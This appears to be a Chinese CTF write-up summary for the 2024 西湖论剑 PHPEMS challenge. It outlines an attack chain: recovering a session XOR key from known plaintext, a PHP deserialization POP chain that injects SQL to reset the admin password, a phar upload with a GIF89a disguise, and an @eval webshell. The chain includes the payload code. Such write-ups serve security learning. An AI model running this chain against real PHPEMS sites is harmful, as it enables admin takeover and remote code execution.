---
title: 西湖论剑 2024/PHPEMS
contest: 西湖论剑
year: 2024
difficulty: medium
vuln_type:
- deserialize
- phar
- sqli
- rce
tags:
- PHPEMS
- session 反序列化
- 已知明文攻击
- 还原 XOR key
- 二级 SQL 注入
- phar 文件上传触发
attack_chain:
- 定位 lib/strings.cls.php 的 decode 函数触发反序列化入口
- 每次访问发 session：sessionid (md5) + sessionip (可控 XFF) + sessiontimelimit (时间戳)
- encode/decode 用 32 字节 key 循环 XOR
- substr($info, 64, 32) 提取已知明文段 'sessionip";s:9:"127.0.0.1";s:1'
- 写 reverse 脚本用 已知明文 XOR 密文 反推出 32 字节 key
- 构造 session 命名空间 pop 链：session.__destruct → pdosql.makeUpdate → pepdo.exec
- 注入 tablepre = 'x2_user set userpassword=md5(123) where username=peadmin;#--'
- 登录后台，文件上传 phar（GIF89a 头绕过）
- 微信接口 file_get_contents 接受 phar:// 触发 phar 反序列化
- 后台模板管理写入 @eval($_POST[1]) 拿 shell
key_payload: "namespace PHPEMS { class session { public function __construct() { $this->pdosql = new pdosql(); $this->db = new pepdo(); } } class pdosql { public function __construct() { $this->tablepre = 'x2_user set userpassword=\"e10adc3949ba59abbe56e057f20f883e\" where username=\"peadmin\";#--'; $this->db = new pepdo(); } } class pepdo { private $linkid = 0; } }"
one_liner: session 已知明文还原 XOR key + pop 链改 admin 密码 + 后台 phar 上传 RCE
lesson: PHP 自定义 session 加密可用已知明文 (client IP/time) 反推 key；PDO prepare 字符串拼接仍可注入；phar:// + file_get_contents 是经典 phar 反序列化触发点
quality: medium
---

# 西湖论剑 2024/PHPEMS

**session 已知明文还原 XOR key + pop 链改 admin 密码 + 后台 phar 上传 RCE**

> 西湖论剑 · 2024 · medium · deserialize/phar/sqli/rce · quality=medium
> 思路: 定位 lib/strings.cls.php 的 decode 函数触发反序列化入口 → 每次访问发 session：sessionid (md5) + sessionip (可控 XFF) + sessiontimelimit (时间戳) → encode/decode 用 32 字节 key 循环 XOR → substr($info, 64, 32) 提取已知明文段 'sessionip";s:9:"127.0.0.1";s:1' → 写 reverse 脚本用 已知明文 XOR 密文 反推出 32 字节 key → 构造 session 命名空间 pop 链：session.__destruct → pdosql.makeUpdate → pepdo.exec → 注入 tablepre = 'x2_user set userpassword=md5(123) where username=peadmin;#--' → 登录后台，文件上传 phar（GIF89a 头绕过） → 微信接口 file_get_contents 接受 phar:// 触发 phar 反序列化 → 后台模板管理写入 @eval($_POST[1]) 拿 shell
> 套路: PHP 自定义 session 加密可用已知明文 (client IP/time) 反推 key；PDO prepare 字符串拼接仍可注入；phar:// + file_get_contents 是经典 phar 反序列化触发点

**关键 payload**:
```php
namespace PHPEMS {
  class session {
    public function __construct() {
      $this->pdosql = new pdosql();
      $this->db = new pepdo();
    }
  }
  class pdosql {
    public function __construct() {
      $this->tablepre = 'x2_user set userpassword="e10adc..." where username="peadmin";#--';
      $this->db = new pepdo();
    }
  }
  class pepdo { private $linkid = 0; }
}
```
